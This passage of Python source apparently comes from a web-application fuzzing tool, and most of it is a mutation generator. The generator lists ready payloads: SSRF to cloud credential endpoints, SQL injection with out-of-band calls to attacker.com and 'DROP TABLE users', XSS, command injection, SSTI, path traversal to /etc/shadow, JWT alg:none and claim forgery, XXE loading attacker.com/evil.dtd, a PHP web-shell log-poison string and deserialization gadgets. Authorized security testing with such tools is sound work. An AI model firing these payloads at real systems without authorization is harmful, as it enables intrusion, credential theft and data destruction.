            ("07_mass_tier",        "tier",         "admin"),
        ]
        for label, target_name, inject_val in mass_assign_targets:
            if str(param_name).lower() != target_name:
                # __MASS__key=val — generate_tasks ADDS the key (doesn't replace)
                mutations.append((label, f"__MASS__{target_name}={inject_val}"))

    # 08 IDOR Reference Swap --------------------------------------------
    if all_params and looks_like_id(param_name, v):
        for other_name, other_val in all_params.items():
            if (other_name != param_name
                    and looks_like_id(other_name, other_val)
                    and str(other_val) != v):
                mutations.append((f"08_idor_swap_{other_name}", str(other_val)))

    # 09 IDOR Scope Escalation ------------------------------------------
    if looks_like_scope_field(param_name):
        if is_int(v):
            iv = int(v)
            for delta in [-1, 1, -2, 2]:
                nv = str(iv + delta)
                if nv != v:
                    mutations.append((f"09_scope_{delta:+d}", nv))
        mutations += [
            ("09_scope_zero",    "0"),
            ("09_scope_neg1",    "-1"),
            ("09_scope_large",   "999999"),
            ("09_scope_null",    "null"),
            ("09_scope_star",    "*"),
        ]

    # 10 SSRF (replaces near-useless Operator mutations) ---------------
    # Fire on all params; especially useful for url/uri/path/redirect params
    _is_url_param = any(k in str(param_name).lower()
                        for k in ("url", "uri", "path", "redirect", "callback",
                                  "next", "dest", "destination", "return",
                                  "target", "host", "endpoint", "src", "source",
                                  "link", "href", "ref", "webhook", "proxy"))
    _ssrf_base = [
        # Cloud metadata endpoints
        ("10_ssrf_aws_meta",      "http://169.254.169.254/latest/meta-data/"),
        ("10_ssrf_aws_iam",       "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        ("10_ssrf_gcp_meta",      "http://metadata.google.internal/computeMetadata/v1/instance/"),
        ("10_ssrf_azure_meta",    "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
        # Internal hosts
        ("10_ssrf_localhost",     "http://localhost/"),
        ("10_ssrf_127",           "http://127.0.0.1/"),
        ("10_ssrf_0_0_0_0",       "http://0.0.0.0/"),
        ("10_ssrf_internal_10",   "http://10.0.0.1/"),
        ("10_ssrf_internal_172",  "http://172.16.0.1/"),
        # Encoded bypasses
        ("10_ssrf_dec_ip",        "http://2130706433/"),      # 127.0.0.1 decimal
        ("10_ssrf_oct_ip",        "http://0177.0.0.1/"),      # 127.0.0.1 octal
        ("10_ssrf_hex_ip",        "http://0x7f000001/"),      # 127.0.0.1 hex
        # Protocol confusion
        ("10_ssrf_file",          "file:///etc/passwd"),
        ("10_ssrf_dict",          "dict://127.0.0.1:6379/INFO"),
        ("10_ssrf_gopher_redis",  "gopher://127.0.0.1:6379/_INFO%0d%0a"),
    ]
    # For non-URL params, append to existing value (open-redirect style)
    if _is_url_param:
        mutations += _ssrf_base
    else:
        mutations += [(lbl, v + "@" + url.split("//")[-1].rstrip("/"))
                      if "//" in url else (lbl, url)
                      for lbl, url in _ssrf_base[:6]]  # only top 6 for generic params

    # 11 SQL Injection (optimised — removed duplicate/low-value, added OOB) ---
    mutations += [
        # Error-based (trigger syntax errors)
        ("11_sqli_quote",         v + "'"),
        ("11_sqli_dquote",        v + '"'),
        ("11_sqli_or1_cmt",       v + "' OR 1=1--"),
        ("11_sqli_hash",          v + "' OR 1=1#"),
        # UNION-based (column count 1, 4, version)
        ("11_sqli_union1",        v + "' UNION SELECT NULL--"),
        ("11_sqli_union4",        v + "' UNION SELECT NULL,NULL,NULL,NULL--"),
        ("11_sqli_union_ver",     v + "' UNION SELECT @@version--"),
        ("11_sqli_union_db",      v + "' UNION SELECT database()--"),
        ("11_sqli_union_tables",  v + "' UNION SELECT table_name FROM information_schema.tables--"),
        # Time-based blind (multi-DB)
        ("11_sqli_sleep_mysql",   v + "' AND SLEEP(5)--"),
        ("11_sqli_sleep_mssql",   v + "'; WAITFOR DELAY '0:0:5'--"),
        ("11_sqli_sleep_pg",      v + "'; SELECT pg_sleep(5)--"),
        # Boolean blind
        ("11_sqli_blind_and1",    v + "' AND 1=1--"),
        ("11_sqli_blind_and0",    v + "' AND 1=0--"),
        # Error extraction (MySQL/MSSQL)
        ("11_sqli_extractval",    v + "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--"),
        ("11_sqli_updatexml",     v + "' AND UPDATEXML(1,CONCAT(0x7e,user()),1)--"),
        # Out-of-Band (DNS — only fires on vulnerable + DNS-enabled backends)
        ("11_sqli_oob_mysql",     v + "' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\a'))--"),
        ("11_sqli_oob_mssql",     v + "'; EXEC master..xp_dirtree '//attacker.com/a'--"),
        # Second-order / stacked
        ("11_sqli_stacked",       v + "'; DROP TABLE users--"),
        # NoSQL
        ("11_sqli_nosql_ne",      '{"$ne": null}'),
        ("11_sqli_nosql_where",   '{"$where": "sleep(5000)"}'),
        ("11_sqli_nosql_regex",   '{"$regex": ".*"}'),
    ]

    # 12 XSS (trimmed to highest-signal payloads — removed duplicates/low-value) ---
    mutations += [
        # Classic script execution
        ("12_xss_script",         v + "<script>alert(1)</script>"),
        ("12_xss_script_close",   v + "</script><script>alert(1)</script>"),
        # Event handlers — most WAF-bypassing
        ("12_xss_img",            v + '<img src=x onerror=alert(1)>'),
        ("12_xss_svg",            v + "<svg onload=alert(1)>"),
        ("12_xss_input_focus",    v + '<input autofocus onfocus=alert(1)>'),
        ("12_xss_details",        v + "<details open ontoggle=alert(1)>"),
        # Attribute breakout
        ("12_xss_attr_dq",        v + '" autofocus onfocus="alert(1)'),
        ("12_xss_attr_tag_dq",    v + '"><script>alert(1)</script>'),
        # JS protocol (href/src injection)
        ("12_xss_js_proto",       "javascript:alert(1)"),
        ("12_xss_iframe_srcdoc",  v + '<iframe srcdoc="<script>alert(1)</script>">'),
        # Encoded bypass
        ("12_xss_url_enc",        v + "%3Cscript%3Ealert(1)%3C%2Fscript%3E"),
        ("12_xss_unicode_enc",    v + "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"),
        # Polyglot — covers multiple contexts
        ("12_xss_polyglot1",      "'\"--><svg onload=alert(1)>"),
        # WAF bypass via case/tab
        ("12_xss_case_mix",       v + "<ScRiPt>alert(1)</ScRiPt>"),
        ("12_xss_tab_break",      v + "<script\t>alert(1)</script>"),
    ]

    # 11b Command Injection (OS) ----------------------------------------
    mutations += [
        # Unix — direct
        ("11b_cmdi_semi",         v + "; id"),
        ("11b_cmdi_pipe",         v + "| id"),
        ("11b_cmdi_and",          v + "&& id"),
        ("11b_cmdi_backtick",     v + "`id`"),
        ("11b_cmdi_subshell",     v + "$(id)"),
        ("11b_cmdi_newline",      v + "\nid"),
        # Windows
        ("11b_cmdi_win_amp",      v + "& whoami"),
        ("11b_cmdi_win_pipe",     v + "| whoami"),
        ("11b_cmdi_win_caret",    v + "^& whoami"),
        # Blind — time-based
        ("11b_cmdi_sleep_unix",   v + "; sleep 5"),
        ("11b_cmdi_sleep_win",    v + "& timeout /t 5"),
        ("11b_cmdi_ping",         v + "; ping -c 4 127.0.0.1"),
        # Encoded
        ("11b_cmdi_enc_semi",     v + "%3B id"),
        ("11b_cmdi_enc_pipe",     v + "%7C id"),
        ("11b_cmdi_ifs",          v + "${IFS}id"),
    ]

    # 13 SSTI -----------------------------------------------------------
    mutations += [
        ("13_ssti_jinja",       v + "{{7*7}}"),
        ("13_ssti_jinja_cfg",   v + "{{config.items()}}"),
        ("13_ssti_jinja_os",    v + "{{''.__class__.__mro__[2].__subclasses__()}}"),
        ("13_ssti_twig",        v + "{{_self.env.registerUndefinedFilterCallback('system')}}"),
        ("13_ssti_freemarker",  v + "${7*7}"),
        ("13_ssti_velocity",    v + "#set($x=7*7)${x}"),
        ("13_ssti_erb",         v + "<%= 7*7 %>"),
        ("13_ssti_smarty",      v + "{php}echo `id`;{/php}"),
        ("13_ssti_tornado",     v + "{% import os %}{{ os.popen('id').read() }}"),
        ("13_ssti_mako",        v + "${7*7}"),
    ]

    # 14 Path Traversal -------------------------------------------------
    mutations += [
        ("14_path_unix",      "../../../etc/passwd"),
        ("14_path_win",       "..\\..\\..\\windows\\win.ini"),
        ("14_path_encoded",   "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
        ("14_path_null",      "../../../etc/passwd\x00.jpg"),
        ("14_path_dotdot",    "....//....//....//etc/passwd"),
        ("14_path_shadow",    "../../../etc/shadow"),
        ("14_path_proc",      "/proc/self/environ"),
        ("14_path_absolute",  "/etc/passwd"),
        ("14_path_win_abs",   "C:\\Windows\\system.ini"),
        ("14_path_utf8",      "..%c0%af..%c0%af..%c0%afetc/passwd"),
        ("14_path_unicode",   "..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd"),
    ]

    # 15 Null / Empty / Undefined ---------------------------------------
    mutations += [
        ("15_null",          "null"),
        ("15_null_caps",     "NULL"),
        ("15_null_none",     "None"),
        ("15_undefined",     "undefined"),
        ("15_empty",         ""),
        ("15_null_byte",     v + "\x00"),
        ("15_space",         " "),
        ("15_nil",           "nil"),
        ("15_nan",           "NaN"),
        ("15_false_str",     "false"),
        ("15_void0",         "void(0)"),
    ]

    # 16 Whitespace Bypass ----------------------------------------------
    if v:
        mutations += [
            ("16_ws_lead",       " " + v),
            ("16_ws_trail",      v + " "),
            ("16_ws_tab",        "\t" + v),
            ("16_ws_newline",    "\n" + v),
            ("16_ws_double",     "  " + v + "  "),
            ("16_ws_cr",         "\r" + v),
            ("16_ws_nbsp",       "\u00a0" + v),
            ("16_ws_zero_width", "\u200b" + v),
        ]

    # 17 Case Mutation --------------------------------------------------
    if v and v.replace("_", "").replace("-", "").isalpha():
        if v != v.upper():
            mutations.append(("17_case_upper",   v.upper()))
        if v != v.lower():
            mutations.append(("17_case_lower",   v.lower()))
        if v != v.capitalize():
            mutations.append(("17_case_cap",     v.capitalize()))
        mixed = "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(v))
        if mixed != v:
            mutations.append(("17_case_mixed",   mixed))

    # 18 Role / privilege — inject EXTRA query/body keys (not encoded into value)
    mutations += [
        ("18_role_admin",      "__EXTRA__role=admin"),
        ("18_role_is_admin",   "__EXTRA__isAdmin=true"),
        ("18_role_super",      "__EXTRA__privilege=superuser"),
        ("18_role_staff",      "__EXTRA__is_staff=true"),
        ("18_role_root_grp",   "__EXTRA__group=root"),
        ("18_role_perm_rw",    "__EXTRA__permission=readwrite"),
        ("18_role_scope_all",  "__EXTRA__scope=*"),
        ("18_role_access_all", "__EXTRA__access=all"),
        ("18_role_plan_ent",   "__EXTRA__plan=enterprise"),
        ("18_role_tier_admin", "__EXTRA__tier=admin"),
        ("18_role_verified",   "__EXTRA__is_verified=true"),
        ("18_role_approved",   "__EXTRA__is_approved=true"),
    ]

    # 19 Negative Logic Bypass ------------------------------------------
    mutations += [
        ("19_neg_not",    "not_" + v),
        ("19_neg_non",    "non_" + v),
        ("19_neg_no",     "no_" + v),
        ("19_neg_un",     "un" + v),
        ("19_neg_dis",    "dis" + v),
        ("19_neg_excl",   "!" + v),
        ("19_neg_tilde",  "~" + v),
        ("19_neg_minus",  "-" + v),
    ]

    # 20 Array / Multi-value Injection ----------------------------------
    mutations += [
        ("20_arr_bracket",  v + "[]"),
        ("20_arr_idx0",     v + "[0]"),
        ("20_arr_json",     "[" + v + "]"),
        ("20_arr_multi",    f"__HPP__{v}"),          # real duplicate param
        ("20_arr_csv",      v + "," + v),
        ("20_arr_pipe",     v + "|" + v),
    ]

    # 21 HTTP Parameter Pollution — real duplicate keys via __HPP__
    mutations += [
        ("21_hpp_admin",    "__HPP__admin"),
        ("21_hpp_dup",      f"__HPP__{v}"),
        ("21_hpp_true",     "__HPP__true"),
        ("21_hpp_1",        "__HPP__1"),
        ("21_hpp_root",     "__HPP__root"),
        ("21_hpp_super",    "__HPP__superuser"),
    ]

    # 22 Format String --------------------------------------------------
    mutations += [
        ("22_fmt_pct_s",    v + "%s%s%s%s"),
        ("22_fmt_pct_n",    v + "%n%n%n%n"),
        ("22_fmt_pct_d",    v + "%d%d%d%d"),
        ("22_fmt_curly",    v + "{0}{1}{2}"),
        ("22_fmt_dotnet",   v + "{0:d}"),
        ("22_fmt_python",   v + "%(x)s"),
        ("22_fmt_spring",   v + "#{7*7}"),
        ("22_fmt_el",       v + "${7*7}"),
    ]

    # 23 Type Confusion -------------------------------------------------
    if is_int(v):
        mutations += [
            ("23_type_str",        '"' + v + '"'),
            ("23_type_array",      "[" + v + "]"),
            ("23_type_bool_t",     "true"),
            ("23_type_bool_f",     "false"),
            ("23_type_float",      str(float(v))),
            ("23_type_obj",        '{"value":' + v + '}'),
        ]
    else:
        mutations += [
            ("23_type_int0",       "0"),
            ("23_type_int1",       "1"),
            ("23_type_array",      '["' + v[:50] + '"]'),
            ("23_type_json_null",  "null"),
            ("23_type_bool_t",     "true"),
            ("23_type_bool_f",     "false"),
            ("23_type_obj",        '{"value":"' + v[:50] + '"}'),
        ]

    # 24 Long Value / Buffer Boundary -----------------------------------
    mutations += [
        ("24_len_256",   "A" * 256),
        ("24_len_1024",  "A" * 1024),
        ("24_len_4096",  "A" * 4096),
    ]

    # 25 Special Characters ---------------------------------------------
    mutations += [
        ("25_sc_semicolon",   v + ";"),
        ("25_sc_pipe",        v + "|id"),
        ("25_sc_amp",         v + "&"),
        ("25_sc_backtick",    v + "`whoami`"),
        ("25_sc_dollar",      v + "$(id)"),
        ("25_sc_crlf",        v + "\r\nX-Injected: true"),
        ("25_sc_rtl",         v + "\u202e"),
        ("25_sc_null_byte",   v + "\x00"),
        ("25_sc_percent00",   v + "%00"),
        ("25_sc_dbl_slash",   v + "//"),
        ("25_sc_dotdot",      v + ".."),
        ("25_sc_lt_gt",       v + "<>"),
        ("25_sc_hash",        v + "#"),
        ("25_sc_at",          v + "@"),
        ("25_sc_backslash",   v + "\\"),
        ("25_sc_brace",       v + "{}"),
    ]

    # 26 Business Logic -------------------------------------------------
    if looks_like_price(param_name):
        mutations += [
            ("26_biz_zero_price",    "0"),
            ("26_biz_neg_price",     "-1"),
            ("26_biz_neg_qty",       "-100"),
            ("26_biz_free",          "0.00"),
            ("26_biz_discount_max",  "100"),
            ("26_biz_overflow",      "999999999999"),
            ("26_biz_float_neg",     "-0.01"),
        ]
    if looks_like_date(param_name, v):
        past      = (now - timedelta(days=3650)).strftime("%Y-%m-%d")
        future    = (now + timedelta(days=3650)).strftime("%Y-%m-%d")
        yesterday = (now - timedelta(days=1)).strftime("%Y-%m-%d")
        tomorrow  = (now + timedelta(days=1)).strftime("%Y-%m-%d")
        mutations += [
            ("26_biz_past_date",   past),
            ("26_biz_future_date", future),
            ("26_biz_yesterday",   yesterday),
            ("26_biz_tomorrow",    tomorrow),
            ("26_biz_epoch",       "1970-01-01"),
            ("26_biz_y2k",         "2000-01-01"),
            ("26_biz_max_date",    "9999-12-31"),
        ]
    if looks_like_owner_field(param_name):
        mutations += [
            ("26_biz_own_zero",   "0"),
            ("26_biz_own_neg1",   "-1"),
            ("26_biz_own_null",   "null"),
        ]
    mutations += [
        ("26_biz_neg_count",  "-1"),
        ("26_biz_zero_count", "0"),
        ("26_biz_max_limit",  "9999999"),
        ("26_biz_bypass",     "bypass"),
        ("26_biz_test_flag",  "test"),
        ("26_biz_debug",      "debug"),
        ("26_biz_internal",   "internal"),
        ("26_biz_skip",       "skip"),
        ("26_biz_self_ref",   param_name),
    ]

    # 27 JSON Key / Prototype Injection ---------------------------------
    mutations += [
        ("27_proto_pollution",   v + ',"__proto__":{"isAdmin":true}'),
        ("27_constructor_rce",   v + ',"constructor":{"prototype":{"isAdmin":true}}'),
        ("27_nosql_gt",          '{"$gt":""}'),
        ("27_nosql_ne",          '{"$ne":null}'),
        ("27_nosql_where",       '{"$where":"sleep(5000)"}'),
        ("27_nosql_regex",       '{"$regex":".*"}'),
        ("27_nosql_exists",      '{"$exists":true}'),
        ("27_graphql_intr",      v + '\\n{__schema{types{name}}}'),
    ]

    # 28 Header / Host Injection — real HTTP headers via __HEADER__
    mutations += [
        ("28_xff_loopback",     "__HEADER__X-Forwarded-For=127.0.0.1"),
        ("28_xff_private",      "__HEADER__X-Forwarded-For=10.0.0.1"),
        ("28_xff_localhost",    "__HEADER__X-Forwarded-For=localhost"),
        ("28_x_orig_url",       "__HEADER__X-Original-URL=/admin"),
        ("28_x_rewrite_url",    "__HEADER__X-Rewrite-URL=/admin"),
        ("28_host_spoof",       f"__HEADER__X-Forwarded-Host={v}.attacker.com"),
        ("28_x_custom_ip",      "__HEADER__X-Real-IP=0.0.0.0"),
        ("28_forwarded",        "__HEADER__Forwarded=for=127.0.0.1;host=localhost;proto=https"),
    ]

    # 29 Encoding Bypass ------------------------------------------------
    import base64 as _b64
    b64_v = _b64.b64encode(v.encode()).decode() if v else ""
    mutations += [
        ("29_base64",           b64_v),
        ("29_url_double",       urllib.parse.quote(urllib.parse.quote(v))),
        ("29_unicode_escape",   v.encode("unicode_escape").decode()),
        ("29_hex_encode",       v.encode().hex()),
        ("29_html_entity",      v.replace("<", "&lt;").replace(">", "&gt;")),
        ("29_utf16",            v.encode("utf-16").hex()),
    ]

    # 30 Auth Token Tamper ----------------------------------------------
    # Build JWT-specific payloads only when the value looks like a JWT
    _jwt_payloads = [
        ("30_auth_empty",        ""),
        ("30_auth_null",         "null"),
        ("30_auth_invalid",      "eyJhbGciOiJIUzI1NiJ9.invalid.invalid"),
        ("30_auth_expired",      "Bearer expired_token_12345"),
        ("30_auth_whitespace",   " "),
        # alg:none — 3 case variants to bypass naive checks
        ("30_auth_alg_none_lc",  "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.e30."),
        ("30_auth_alg_none_uc",  "eyJBTEciOiJOT05FIiwidHlwIjoiSldUIn0.e30."),
        ("30_auth_alg_none_mx",  "eyJhbGciOiJOb05lIiwidHlwIjoiSldUIn0.e30."),
        # Signature stripped (keep header.payload, remove signature)
    ]
    _jwt_str = str(v)
    if _jwt_str.count(".") == 2:
        _parts = _jwt_str.split(".")
        # Strip signature — some libs verify header.payload only
        _jwt_payloads.append(("30_jwt_no_sig", f"{_parts[0]}.{_parts[1]}."))
        # RS256→HS256 algorithm confusion
        try:
            _hdr_pad  = _parts[0] + "=" * (-len(_parts[0]) % 4)
            _hdr_dec  = json.loads(_b64_top.urlsafe_b64decode(_hdr_pad))
            if _hdr_dec.get("alg", "").upper() in ("RS256", "RS384", "RS512",
                                                    "ES256", "ES384", "ES512"):
                _hdr_dec["alg"] = "HS256"
                _hdr_new  = _b64_top.urlsafe_b64encode(
                    json.dumps(_hdr_dec, separators=(",", ":")).encode()
                ).rstrip(b"=").decode()
                _jwt_payloads.append(("30_jwt_alg_confusion",
                                      f"{_hdr_new}.{_parts[1]}.AAAA"))
        except Exception:
            pass
        # Inject admin claims into payload
        try:
            _pay_pad  = _parts[1] + "=" * (-len(_parts[1]) % 4)
            _pay_dec  = json.loads(_b64_top.urlsafe_b64decode(_pay_pad))
            for _claim_k, _claim_v in [("role", "admin"), ("is_admin", True),
                                        ("scope", "admin:*"), ("exp", 9999999999)]:
                _pay_mod  = dict(_pay_dec)
                _pay_mod[_claim_k] = _claim_v
                _pay_new  = _b64_top.urlsafe_b64encode(
                    json.dumps(_pay_mod, separators=(",", ":")).encode()
                ).rstrip(b"=").decode()
                _jwt_payloads.append((f"30_jwt_claim_{_claim_k}",
                                      f"{_parts[0]}.{_pay_new}."))
        except Exception:
            pass
    mutations += _jwt_payloads

    # 31 XXE (XML External Entity) -----------------------------------------
    # Fire for all params — server may parse XML regardless of Content-Type
    _is_xml_param = (
        "<" in v
        or "xml" in str(param_name).lower()
        or (all_params and any("content-type" in str(k).lower() and "xml" in str(vv).lower()
                               for k, vv in (all_params.items() if hasattr(all_params, 'items') else [])))
    )
    mutations += [
        ("31_xxe_basic",      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'),
        ("31_xxe_ssrf",       '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>'),
        ("31_xxe_oob",        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><foo/>'),
        ("31_xxe_php_filter", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>'),
        ("31_xxe_expect",     '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>'),
        ("31_xxe_netdoc",     '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">]><foo>&xxe;</foo>'),
        ("31_xxe_wrap",       v + '<?xml version="1.0"?><!DOCTYPE x[<!ENTITY x SYSTEM "file:///etc/passwd">]><x>&x;</x>'),
        ("31_xxe_cdata",      '<![CDATA[' + v + ']]>'),
    ]

    # 32 Open Redirect -----------------------------------------------------
    _is_redirect_param = any(k in str(param_name).lower() for k in (
        "redirect", "next", "return", "url", "goto", "dest", "target",
        "continue", "forward", "back", "redir", "location", "link",
        "navigate", "ref", "returnurl", "returnto",
    ))
    if _is_redirect_param:
        mutations += [
            ("32_redir_proto",      "//attacker.com"),
            ("32_redir_https",      "https://attacker.com"),
            ("32_redir_backslash",  "/\\attacker.com"),
            ("32_redir_encoded",    "https%3A%2F%2Fattacker.com"),
            ("32_redir_at",         "https://legitimate.com@attacker.com"),
            ("32_redir_wrap",       "https://legitimate.com.attacker.com"),
            ("32_redir_null",       "https://attacker.com%00.legitimate.com"),
            ("32_redir_fragment",   "https://legitimate.com#https://attacker.com"),
            ("32_redir_crlf",       "https://legitimate.com\r\nLocation: https://attacker.com"),
            ("32_redir_data",       "data:text/html,<script>alert(document.domain)</script>"),
            ("32_redir_js",         "javascript:alert(document.domain)"),
            ("32_redir_triple",     "///attacker.com"),
            ("32_redir_scheme",     v + "@attacker.com"),
        ]

    # 33 LDAP Injection ----------------------------------------------------
    mutations += [
        ("33_ldap_star",        v + "*"),
        ("33_ldap_or",          v + ")(|(password=*)"),
        ("33_ldap_admin_all",   "*)(uid=*))(|(uid=*"),
        ("33_ldap_bypass",      v + ")(|(objectclass=*)"),
        ("33_ldap_null",        v + "\x00"),
        ("33_ldap_paren",       "(" + v + ")"),
        ("33_ldap_bang",        v + "!(objectclass=*)"),
        ("33_ldap_or_inject",   "*()|%26'"),
        ("33_ldap_blind_t",     v + ")(|(uid=*)"),
        ("33_ldap_blind_f",     v + ")(|(uid=INVALID)"),
    ]

    # 34 CRLF Injection ----------------------------------------------------
    mutations += [
        ("34_crlf_header",       v + "\r\nX-Injected: true"),
        ("34_crlf_cookie",       v + "\r\nSet-Cookie: admin=true; Path=/"),
        ("34_crlf_redirect",     v + "\r\nLocation: https://attacker.com"),
        ("34_crlf_encoded",      v + "%0d%0aX-Injected: true"),
        ("34_crlf_double_enc",   v + "%250d%250aX-Injected: true"),
        ("34_crlf_lf_only",      v + "\nX-Injected: true"),
        ("34_crlf_unicode_cr",   v + "\r\nX-Injected: true"),
        ("34_crlf_resp_split",   v + "\r\n\r\n<html><script>alert(1)</script></html>"),
        ("34_crlf_log_poison",   v + "\r\n\r\n<?php system($_GET['cmd']); ?>"),
        ("34_crlf_ua_inject",    v + "\r\nUser-Agent: injected"),
    ]

    # 35 Insecure Deserialization ------------------------------------------
    mutations += [
        # PHP object injection
        ("35_deser_php_obj",     'O:8:"stdClass":1:{s:5:"admin";b:1;}'),
        ("35_deser_php_arr",     'a:2:{s:4:"role";s:5:"admin";s:8:"is_admin";b:1;}'),
        ("35_deser_php_sleep",   'O:8:"DateTime":0:{}'),
        # Python pickle (base64 encoded)
        ("35_deser_pickle",      "gASVKAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjA5lY2hvIFZVTE5FQUJMRJSF\nlFKULg=="),
        # Java serialized (magic bytes base64)
        ("35_deser_java_b64",    "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA=="),
        # Node.js prototype pollution via JSON
        ("35_deser_proto",       '{"__proto__":{"isAdmin":true,"role":"admin"}}'),
        ("35_deser_constructor", '{"constructor":{"prototype":{"isAdmin":true}}}'),
        # Ruby YAML deserialization
        ("35_deser_yaml",        "--- !ruby/object:Gem::Installer\ni: !ruby/object:Gem::Package::TarReader\n  io: !ruby/object:Net::BufferedIO\n    io: !ruby/object:Gem::Package::TarReader::Entry\n      read: 0\n      header: aaa\n    debug_output: !ruby/object:Net::WriteAdapter\n      socket: !ruby/object:Gem::RequestSet\n        sets: !ruby/object:Net::WriteAdapter\n          socket: !ruby/module 'Kernel'\n          method_id: :system\n        git_set: id\n      method_id: :resolve\n"),
        # .NET ViewState
        ("35_deser_viewstate",   "/wEykBQAAQAAAP////8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxs"),
    ]

    # 36 ReDoS (Regular Expression Denial of Service) ---------------------
    mutations += [
        ("36_redos_email",       "a@" + "a." * 50 + "com"),
        ("36_redos_repeat",      "a" * 50 + "!"),
        ("36_redos_nested_q",    "((a+)+b)" * 3 + "c"),
        ("36_redos_alternation", "(a|aa)" * 15 + "b"),
        ("36_redos_backtrack",   "a?" * 30 + "a" * 30),
        ("36_redos_unicode",     "A" * 100 + "!"),
        ("36_redos_long_str",    "A" * 50000),
        ("36_redos_catastrophic", "a" * 100 + "b"),
    ]

    # 37 XPath Injection ---------------------------------------------------
    mutations += [
        ("37_xpath_or_true",     v + "' or '1'='1"),
        ("37_xpath_or_admin",    "' or username='admin"),
        ("37_xpath_all",         "' or 1=1 or ''='"),
        ("37_xpath_comment",     v + "']/..//user[name()='admin"),
        ("37_xpath_double_q",    v + '" or "1"="1'),
        ("37_xpath_blind_t",     v + "' and count(/*)>0 and '1'='1"),
        ("37_xpath_blind_f",     v + "' and count(/*)=0 and '1'='1"),
        ("37_xpath_extract",     v + "'] | //user/password | //foo['"),
        ("37_xpath_string_len",  v + "' and string-length(//user[1]/password)>0 and '1'='1"),
        ("37_xpath_position",    v + "' and position()=1 and '1'='1"),
    ]

    # 38 GraphQL Injection -------------------------------------------------
    _is_gql_param = any(k in str(param_name).lower() for k in
        ("query", "mutation", "subscription", "variables", "operationname",
         "graphql", "gql", "operation"))
    mutations += [
        ("38_gql_introspect",    '{"query":"{__schema{types{name fields{name}}}}"}'),
        ("38_gql_typename",      '{"query":"{__typename}"}'),
        ("38_gql_field_suggest", '{"query":"{__type(name:\\"User\\"){fields{name}}}"}'),
        ("38_gql_mutation_priv", '{"query":"mutation{updateUser(id:1,role:\\"admin\\"){id role}}"}'),
        ("38_gql_nosql",         '{"query":"{users(filter:{role:{_eq:\\"admin\\"}}){id email}}"}'),
        ("38_gql_depth_bomb",    '{"query":"{user{friends{friends{friends{friends{id}}}}}}"}'),
        ("38_gql_alias_dos",     '{"query":"{' + ' '.join([f'a{i}:__typename' for i in range(50)]) + '}"}'),
        ("38_gql_inject",        v + ' { __schema { types { name } } }'),
        ("38_gql_batch",         '[{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"}]'),
        ("38_gql_fragment",      '{"query":"fragment f on __Schema{types{name}} {__schema{...f}}"}'),
    ]

    # Dedup: never return original value
    seen = {v}
    deduped = []
    for label, mut_val in mutations:
        s = str(mut_val)
        if s not in seen:
            seen.add(s)
            deduped.append((label, mut_val))

    if categories is not None:
        deduped = [(lbl, mv) for lbl, mv in deduped
                   if any(lbl.startswith(c) for c in categories)]

    return deduped


# ---------------------------------------------------------------------------
#  cURL PARSER
# ---------------------------------------------------------------------------

def parse_curl_text(text: str):
    """
    Parse a raw cURL command string and return a CURLEntry.
    Uses the shared AV-grade curl_parser (multi -d, --json, -F, -G, Basic auth, etc.).
    """
    try:
        from curl_parser import parse_curl_command
        d = parse_curl_command(text)
    except ImportError:
        # Fallback path when running outside the package layout
        import importlib.util, os, sys
        _here = os.path.dirname(os.path.abspath(__file__))
        for _p in (
            os.path.join(_here, "curl_parser.py"),
            os.path.join(os.path.dirname(_here), "curl_parser.py"),
        ):
            if os.path.isfile(_p):
                _spec = importlib.util.spec_from_file_location("_pt_curl_parser", _p)
                _mod = importlib.util.module_from_spec(_spec)
                _spec.loader.exec_module(_mod)
                d = _mod.parse_curl_command(text)
                break
        else:
            raise
    except ValueError:
        raise
    except Exception as e:
        raise ValueError(f"Cannot parse cURL command: {e}") from e

    method = d.get("method") or "GET"
    url = d.get("url") or ""
    headers = dict(d.get("headers") or {})
    query_params = dict(d.get("query_params") or {})
    body = d.get("body")
    body_type = d.get("body_type")
    # Prefer raw string for "raw" body_type when body is already a string
    if body_type == "raw" and body is None and d.get("body_raw") is not None:
        body = d.get("body_raw")
    return CURLEntry(method, url, headers, query_params, body, body_type)


def parse_curl_file(curl_path):
    """
    Read a cURL command from a file and return a CURLEntry.
    Thin wrapper around parse_curl_text.
    """
    with open(curl_path, "r", encoding="utf-8") as f:
        raw = f.read()
    return parse_curl_text(raw)


def parse_multi_curl_file(path):
    """
    Read a file containing multiple cURL commands separated by lines containing
    only '---' and return a list[CURLEntry]. Blocks that fail to parse are
    skipped with a warning.
    """
    with open(path, "r", encoding="utf-8") as f:
        content = f.read()

    # Split on separator lines (--- on its own line, with optional surrounding whitespace)
    blocks = re.split(r'\n\s*---\s*\n', content)
    entries = []
    for idx, block in enumerate(blocks, 1):
        block = block.strip()
        if not block:
            continue
        try:
            entries.append(parse_curl_text(block))
        except Exception as e:
            print(f"  [!] Skipping block {idx}: {e}")
    return entries


def parse_har_file(har_path):
    """
    Parse a HAR (HTTP Archive) JSON file and return list[CURLEntry].
    Skips data: and blob: URLs.
    """
    with open(har_path, "r", encoding="utf-8") as f:
        har = json.load(f)

    entries = []
